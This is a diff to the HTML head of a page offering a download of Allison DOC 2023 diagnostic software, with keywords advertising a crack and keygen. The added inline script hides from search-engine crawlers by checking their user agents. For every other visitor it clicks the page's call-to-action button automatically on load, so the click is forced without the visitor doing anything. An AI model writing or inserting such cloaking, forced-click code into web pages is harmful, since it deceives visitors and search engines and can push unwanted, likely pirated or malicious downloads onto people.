@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Allison DOC v3 2023</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Allison DOC v3 2023 diagnostic software for real-time transmission parameter reading, TCM reprogramming, and control units diagnostics.">
     <meta name="keywords" content="Allison DOC v3 2023, Allison DOC 2023.3 download, Allison DOC 2023.3 free download, Allison DOC 2023.3 crack, Allison DOC 2023.3 keygen, Allison DOC v2023.3 build 12.2023, Allison DOC diagnostic software, Allison DOC diagnostic software download, Allison DOC diagnostic software free download, Allison DOC 12.2023, Allison DOC Gen 6 data files, Allison DOC Gen 6 data files 12.2023, Allison diagnostic software 2023, Allison diagnostic software free download, Allison DOC 6th generation download, Allison DOC Windows diagnostic software, Allison DOC Nexiq USB-Link, Allison Transmission diagnostic software, Allison Transmission reprogramming, скачать Allison DOC 2023.3, бесплатная загрузка Allison DOC 2023.3, Allison DOC 2023.3 скачать бесплатно, диагностическое программное обеспечение Allison DOC, скачать диагностическое программное обеспечение Allison DOC, діагностичне програмне забезпечення Allison DOC, Allison DOC діагностичне ПЗ завантажити, завантажити Allison DOC 2023.3, Allison FracTran transmission support, Allison diagnostic software Nexiq USB-Link, Allison DOC supported hardware, Allison DOC control units diagnostics, Allison DOC TCM reprogramming, Allison FuelSense setup">
     <style>
